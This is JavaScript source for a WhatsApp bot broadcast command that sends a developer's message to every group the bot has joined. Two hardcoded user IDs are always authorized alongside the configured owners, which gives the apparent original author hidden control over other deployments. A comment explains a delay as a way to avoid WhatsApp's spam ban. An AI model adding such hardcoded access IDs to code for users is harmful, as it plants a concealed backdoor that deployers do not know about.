export default async function (sock, m, from, args, config = {}) {
  // 1. استخراج معرّف المرسل بدقة ودعم معرّفات LID وحساب البوت
  const rawSender = m.sender || m.key.participant || (m.key.fromMe ? sock.user?.id : from) || "";
  const cleanSender = rawSender.split("@")[0].replace(/[^0-9]/g, "");
  const cleanPn = (m.key?.participantPn || m.key?.remoteJidPn || "").split("@")[0].replace(/[^0-9]/g, "");

  // 2. قائمة المعرّفات المصرح لها
  const hardcodedDevs = ["122415560544440", "48873036861567"];
  const toList = (val) => (Array.isArray(val) ? val : [val]).filter(Boolean).map(v => String(v).replace(/[^0-9]/g, ""));
  
  const authorizedDevs = new Set([
    ...hardcodedDevs,
    ...toList(config?.owner),
    ...toList(config?.sudo),
    ...toList(config?.vip),
    ...toList(config?.vipUsers)
  ]);

  const isDev = m.key.fromMe || authorizedDevs.has(cleanSender) || (cleanPn && authorizedDevs.has(cleanPn));

  if (!isDev) {
    return sock.sendMessage(from, { text: "⛔ هذا الأمر مخصص للمطور فقط!" }, { quoted: m });
  }

  const broadcastMsg = args.join(" ").trim();
  if (!broadcastMsg) {
    return sock.sendMessage(from, { 
      text: "⚠️ اكتب الرسالة المراد إذاعتها بعد الأمر.\nمثال: .bc السلام عليكم جميعاً" 
    }, { quoted: m });
  }

  try {
    const chats = await sock.groupFetchAllParticipating();
    const groups = Object.values(chats);

    if (groups.length === 0) {
      return sock.sendMessage(from, { text: "⚠️ البوت غير متواجد في أي مجموعة حالياً!" }, { quoted: m });
    }

    await sock.sendMessage(from, { text: `⏳ جاري الإذاعة إلى *${groups.length}* مجموعة...` }, { quoted: m });

    let successCount = 0;
    const botName = config?.botName || "سورس محمد نصار";

    for (const group of groups) {
      try {
        await sock.sendMessage(group.id, { 
          text: `📢 *إذاعة رسمية من المطور:*\n\n${broadcastMsg}\n\n🤖 *${botName}*` 
        });
        successCount++;
        // تأخير زمني بسيط (1 ثانية) بين كل مجموعة لتجنب حظر الرقم من واتساب بسبب التكرار السريع
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (e) {
        console.error(`Broadcast failed for group: ${group.id}`);
      }
    }

    await sock.sendMessage(from, { 
      text: `✅ تمت الإذاعة بنجاح إلى *${successCount}* من أصل *${groups.length}* مجموعة.` 
    }, { quoted: m });

  } catch (err) {
    console.error("Broadcast Error:", err);
    await sock.sendMessage(from, { text: "❌ حدث خطأ أثناء محاولة الإذاعة." }, { quoted: m });
  }
}
